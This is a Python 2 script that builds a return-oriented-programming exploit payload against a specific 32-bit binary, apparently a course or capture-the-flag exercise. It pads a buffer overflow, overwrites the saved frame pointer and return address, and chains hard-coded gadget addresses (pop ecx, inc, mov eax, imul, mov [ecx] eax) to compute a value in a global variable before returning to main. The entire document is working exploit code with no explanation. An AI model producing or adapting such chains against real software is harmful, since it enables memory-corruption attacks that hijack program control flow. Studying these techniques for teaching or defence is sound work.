in1=("\x61"*12 + "\x00"*3)*20

ebp="\x68"*12 + "\x00"*3 +  "\xd5"*12 + "\x00"*3 + "\xff"*12 + "\x00"*3 + "\xff"*12 + "\x00"*3
ret_to_main = "\x53"*12 + "\x00"*3 +  "\x89"*12 + "\x00"*3 + "\x04"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3
glb_add= "\x20"*12 + "\x00"*3 +  "\xba"*12 + "\x00"*3 + "\x0e"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3         # Address of glb


ret_add= "\xb2"*12 + "\x00"*3 +  "\x81"*12 + "\x00"*3 + "\x04"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3         # 0x080481b2 : ret

GA2_pop= "\xb5"*12 + "\x00"*3 +  "\xe8"*12 + "\x00"*3 + "\x0d"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3         # pop ecx ; ret


GA3_inc= "\xd8"*12 + "\x00"*3 +  "\x44"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3         # 0x080844d8 : inc dword ptr [ecx] ; ret
GA4_mov_eax_2= "\x40"*12 + "\x00"*3 +  "\xef"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3   # 
GA4_mov_eax_3= "\x50"*12 + "\x00"*3 +  "\xef"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3   # 0x0808ef50 : mov eax, 3 ; ret
GA4_mov_eax_4= "\x60"*12 + "\x00"*3 +  "\xef"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3   # mov eax, 4 ; ret
GA4_mov_eax_5= "\x70"*12 + "\x00"*3 +  "\xef"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3   # mov eax, 5 ; ret
GA4_mov_eax_6= "\x80"*12 + "\x00"*3 +  "\xef"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3   # mov eax, 6 ; ret
GA4_mov_eax_7= "\x90"*12 + "\x00"*3 +  "\xef"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3   # mov eax, 7 ; ret
GA5_imul = "\xb8"*12 + "\x00"*3 +  "\x30"*12 + "\x00"*3 + "\x06"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3       # imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
#ret 
#GA5_imul="\x19"*12 + "\x00"*3 +  "\x66"*12 + "\x00"*3 + "\x0b"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3  #changed to fmul address
GA6_mov="\xae"*12 + "\x00"*3 +  "\x7f"*12 + "\x00"*3 + "\x0b"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3  # 0x080b7fae : mov dword ptr [ecx], eax ; mov eax, dword ptr [edx + 0x4c] ; ret



pop_edi = "\x80"*12 + "\x00"*3 +  "\x84"*12 + "\x00"*3 + "\x04"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3        # 0x08048480 : pop edi ; ret
cat_add= "\x55"*12 + "\x00"*3 +  "\xce"*12 + "\x00"*3 + "\xff"*12 + "\x00"*3 + "\xff"*12 + "\x00"*3         # to make sure [edi + 0x5e] is a valid address

pop_edx= "\x2a"*12 + "\x00"*3 +  "\xf0"*12 + "\x00"*3 + "\x06"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3         # 0x0806f02a : pop edx; ret
edx_add= "\x68"*12 + "\x00"*3 +  "\xce"*12 + "\x00"*3 + "\xff"*12 + "\x00"*3 + "\xff"*12 + "\x00"*3         # to make sure [edx + 0x4c] is a valid address

eax_inc=  "\x6f"*12 + "\x00"*3 +  "\xa8"*12 + "\x00"*3 + "\x07"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3        # 0x0807a86f : inc eax ; ret

y = in1+ebp+ret_add+pop_edi+cat_add+GA2_pop+glb_add+GA3_inc+GA3_inc+GA4_mov_eax_3+GA5_imul+ret_add+pop_edx+edx_add+GA6_mov+GA4_mov_eax_4+GA5_imul+ret_add+pop_edx+edx_add+GA6_mov+GA4_mov_eax_5+GA5_imul+ret_add+pop_edx+edx_add+GA6_mov+GA4_mov_eax_6+GA5_imul+ret_add+pop_edx+edx_add+GA6_mov+ GA4_mov_eax_7+GA5_imul+ret_add+pop_edx+edx_add+GA6_mov+ GA4_mov_eax_7+eax_inc+GA5_imul+ret_add+pop_edx+edx_add+GA6_mov+ GA4_mov_eax_7+eax_inc+eax_inc+GA5_imul+ret_add+pop_edx+edx_add+GA6_mov+GA4_mov_eax_7+eax_inc+eax_inc+eax_inc+GA5_imul+ret_add+pop_edx+edx_add+GA6_mov+ ret_to_main

x = in1+ebp

 

print y
